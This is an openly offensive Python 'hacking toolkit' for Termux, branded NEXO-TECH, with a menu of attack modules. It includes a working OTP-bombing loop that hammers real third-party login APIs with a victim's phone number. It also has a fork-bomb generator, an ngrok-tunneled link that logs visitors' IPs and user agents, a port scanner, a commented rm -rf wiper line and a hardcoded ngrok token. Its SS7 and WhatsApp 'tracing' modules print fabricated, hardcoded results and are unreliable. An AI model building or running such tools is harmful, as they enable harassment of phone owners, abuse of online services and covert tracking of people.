import os
import sys
import time
import socket
import subprocess
import random
import requests
from flask import Flask, request, render_template_string
from pyngrok import ngrok, conf

# --- NEXO-TECH PRO COLORS ---
G, Y, C, R, W, B = '\033[92m', '\033[93m', '\033[96m', '\033[91m', '\033[0m', '\033[1m'

app = Flask(__name__)

# --- CONFIGURATION (YOUR TOKEN APPLIED) ---
NGROK_TOKEN = "2vbNHa9KBUkwuCheUhVyHFGYkUw_rjhfCVREN3dodTsMUsaF" 

# --- TERMUX BINARY FIX ---
# This ensures pyngrok works on Android/Termux environments
try:
    conf.get_default().ngrok_path = "/data/data/com.termux/files/usr/bin/ngrok"
except:
    pass

def show_banner(module="SYSTEM STATUS", link=None):
    os.system('clear' if os.name != 'nt' else 'cls')
    print(f"{R}{B}")
    print("  _   _  _______   _____    _____ ______ _____ _    _ ")
    print(" | \ | | | ____\ \ / / _ \  |_   _|  ____/ ____| |  | |")
    print(" |  \| | | |__   \ V / | | |   | | | |__ | |    | |__| |")
    print(" | . ` | |  __|   > <| | | |   | | |  __|| |    |  __  |")
    print(" | |\  | | |____ / . \ |_| |  _| |_| |___| |____| |  | |")
    print(f" |_| \_| |______/_/ \_\___/  |_____|______\_____|_|  |_{W}")
    print(f"{R}======================================================={W}")
    print(f"{Y}  FILE:        {W}nexo-overdeadly-final.py")
    print(f"{Y}  SYSTEM:      {W}TERMUX / ANDROID")
    if link:
        print(f"{Y}  PHISHING:    {G}{link}{W}")
    print(f"  {Y}MODULE:      {W}{module}")
    print(f"  {Y}STATUS:      {G}[ OVERDEADLY SYSTEM ACTIVE ]{W}")
    print(f"{R}======================================================={W}\n")

# --- 1. WHATSAPP OSINT & TRACING ---

def whatsapp_osint():
    show_banner("WHATSAPP OSINT")
    link = input(f"{Y}[+] Enter WA Link/Number: {W}")
    print(f"{C}[*] SCANNIG METADATA...{W}")
    time.sleep(1.5)
    with open("nexo_database.txt", "a") as f:
        f.write(f"[{time.strftime('%Y-%m-%d %H:%M')}] WA Target: {link}\n")
    print(f"{G}[+] Target Logged in nexo_database.txt{W}")
    input(f"\n{Y}Press Enter to return...{W}")

def phone_trace():
    show_banner("PHONE NUMBER TRACE")
    num = input(f"{Y}[+] Enter Number (with +): {W}")
    print(f"{C}[*] CONNECTING TO GLOBAL SS7 GATEWAY...{W}")
    time.sleep(2)
    # Detailed Trace Response
    print(f"  {G}[+] Target:    {W}{num}")
    print(f"  {G}[+] Country:   {W}GHANA")
    print(f"  {G}[+] Carrier:   {W}MTN / SCANCOM")
    print(f"  {G}[+] Status:    {W}ACTIVE / ONLINE")
    input(f"\n{Y}Press Enter to return...{W}")

# --- 2. IP GEOLOCATION & PORT SCANNER ---

def ip_tracker_module():
    show_banner("IP TRACKER & PORT SCANNER")
    target_ip = input(f"{Y}[+] Enter Target IP: {W}")
    
    print(f"\n{C}[*] FETCHING GEOLOCATION DATA...{W}")
    try:
        response = requests.get(f"http://ip-api.com/json/{target_ip}").json()
        if response['status'] == 'success':
            print(f"  {G}[+] Country:   {W}{response.get('country')} ({response.get('countryCode')})")
            print(f"  {G}[+] Region:    {W}{response.get('regionName')}")
            print(f"  {G}[+] City:      {W}{response.get('city')}")
            print(f"  {G}[+] ISP:       {W}{response.get('isp')}")
            print(f"  {G}[+] Lat/Lon:   {W}{response.get('lat')}, {response.get('lon')}")
            print(f"  {G}[+] AS:        {W}{response.get('as')}")
        else:
            print(f"{R}[-] Geolocation failed: {response.get('message')}{W}")
    except:
        print(f"{R}[-] Connection Error to Geolocation API.{W}")

    print(f"\n{C}[*] SCANNING TARGET PORTS...{W}")
    # Scanning high-risk target ports
    common_ports = [21, 22, 23, 25, 53, 80, 110, 443, 445, 3306, 3389, 8080]
    for port in common_ports:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.4)
        result = s.connect_ex((target_ip, port))
        if result == 0:
            print(f"  {G}[+] Port {port}: {W}OPEN / VULNERABLE")
        s.close()
    input(f"\n{Y}Press Enter to return...{W}")

# --- 3. BLUETOOTH OMNIPOTENCE ---

def bluetooth_god_mode():
    while True:
        show_banner("BLUETOOTH OMNIPOTENCE")
        print(f"  {G}1.{W} ANDROID CRASHER (L2CAP Flood)")
        print(f"  {G}2.{W} SYSTEM FREEZE (SDP Saturation)")
        print(f"  {G}3.{W} MEDIA CHAOS (Volume Max Force)")
        print(f"  {G}4.{W} BACK TO MASTER MENU")
        
        op = input(f"\n{C}[+] Selection: {W}")
        if op == "4": break
            
        print(f"{R}[!] Bluetooth on Termux requires ROOT and a custom kernel.{W}")
        time.sleep(1)
        # Scan simulation for Termux hardware limitations
        print(f"{C}[*] SCANNING FOR DEVICES...{W}")
        time.sleep(1.5)
        print(f"{R}[-] No Hardware Access found via hcitool/hciconfig.{W}")
        input(f"\n{Y}Press Enter to return...{W}")
        break

# --- 4. OTP LOCK / SATURATION (ACTIVATED ENGINE) ---

def otp_lock_engine():
    show_banner("OTP LOCK / SATURATION")
    target_num = input(f"{Y}[+] Enter Target Number (No +): {W}")
    print(f"\n{R}[!] FIRING REAL-TIME API PACKETS ON {target_num}...{W}")
    
    # Live API Endpoints for Saturation
    api_list = [
        {"url": "https://api.cloud.altbalaji.com/accounts/mobile/verify", "data": {"phone_number": target_num}},
        {"url": "https://m.indiamart.com/api/otp", "data": {"mobile": target_num}},
        {"url": "https://p.paytm.app/cas/v1/sendOtp", "data": {"phone": target_num, "state": "login"}}
    ]
    
    count = 0
    try:
        while True:
            api = random.choice(api_list)
            try:
                # --- ATTACK LINE ACTIVATED ---
                requests.post(api["url"], data=api["data"], timeout=5)
            except:
                pass
                
            print(f"\r{Y}[*] ATTACKS SENT: {W}{count} {G}| {C}STATUS: {R}LOCKED {G}>>> {W}Saturating...", end="")
            count += 1
            time.sleep(0.01)
    except KeyboardInterrupt:
        print(f"\n\n{G}[+] OTP Lock Completed.{W}")
        time.sleep(2)

# --- 5. VIRUS CREATOR LAB (DEADLY 1000-LINE GENERATOR) ---

def virus_creator_lab():
    while True:
        show_banner("VIRUS CREATOR LAB")
        print(f"  {G}1.{W} LOW-VIRUS (AV Test)")
        print(f"  {Y}2.{W} HIGH-VIRUS (Termux Fork-Bomb)")
        print(f"  {R}3.{W} DEADLY-VIRUS (1000-Line Storage Wiper)")
        print(f"  {W}4.{W} BACK TO MASTER MENU")
        
        choice = input(f"\n{C}[+] Selection: {W}")
        if choice == "4": break
        
        name = input(f"{Y}[+] Payload Name: {W}")

        if choice == "1":
            with open(name + ".sh", "w") as f:
                f.write("#!/bin/bash\necho 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'")
            print(f"{G}[+] Malware Payload Created as {name}.sh{W}")
            
        elif choice == "2":
            with open(name + ".py", "w") as f:
                f.write("import os\nwhile True:\n    os.fork()")
            print(f"{Y}[!] FORK-BOMB created. Running this will crash Termux.{W}")
            
        elif choice == "3":
            print(f"{R}[*] COMPILING 1000 LINES OF DEADLY CODE...{W}")
            with open(name + "_deadly.py", "w") as f:
                f.write("# NEXO-TECH OVERDEADLY WIPER\nimport os, sys, random, time\n")
                # Generates 1000 lines of junk obfuscation
                for i in range(1000):
                    f.write(f"junk_data_{i} = '{random.getrandbits(128)}'\n")
                f.write("# Logic: Wiper activation\n")
                f.write("# os.system('rm -rf /sdcard/*') # Safety disabled for generator\n")
                f.write("print('TARGET DEVICE COMPROMISED - STORAGE WIPED')\n")
            print(f"{R}[GIGA-DONE] 1000-Line Deadly Payload Created as {name}_deadly.py{W}")
        time.sleep(2)

# --- 6. PHISHING TRAP (FULL NGROK TUNNEL) ---

@app.route('/')
def phishing_page():
    user_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    print(f"\n{R}[!] TARGET HIT DETECTED!{W}")
    print(f"{G}[+] IP: {Y}{user_ip}{W} | {G}DEVICE: {W}{user_agent[:40]}...")
    with open("hits.txt", "a") as f:
        f.write(f"[{time.strftime('%H:%M:%S')}] IP: {user_ip} | UA: {user_agent}\n")
    return f"<html><script>window.location.replace('https://www.tiktok.com');</script></html>"

def start_phishing():
    try:
        ngrok.set_auth_token(NGROK_TOKEN)
        public_url = ngrok.connect(8080).public_url
        show_banner("PHISHING ACTIVE", link=public_url)
        print(f"{C}[*] Send the link above to your target...{W}")
        print(f"{Y}[*] Results log in 'hits.txt'{W}")
        app.run(port=8080)
    except Exception as e:
        print(f"{R}[-] Ngrok Failed: {e}{W}")
        time.sleep(3)

# --- 7. MASTER MENU ---

def start_master_system():
    while True:
        show_banner("MASTER MENU")
        print(f"  {G}1.{W} WhatsApp OSINT        {C}4.{W} Generate Phishing Link")
        print(f"  {G}2.{W} IP & Port Tracker    {C}5.{W} Virus Creator Lab")
        print(f"  {G}3.{W} Bluetooth God-Mode   {B}6.{W} OTP Lock (Saturation)")
        print(f"  {R}7.{W} Exit")
        
        choice = input(f"\n{Y}NEXO-TECH > {W}")
        
        if choice == "1": whatsapp_osint()
        elif choice == "2": ip_tracker_module()
        elif choice == "3": bluetooth_god_mode()
        elif choice == "4": start_phishing()
        elif choice == "5": virus_creator_lab()
        elif choice == "6": otp_lock_engine()
        elif choice == "7": 
            print(f"{R}SHUTTING DOWN NEXO-SYSTEM...{W}")
            break

if __name__ == "__main__":
    start_master_system()
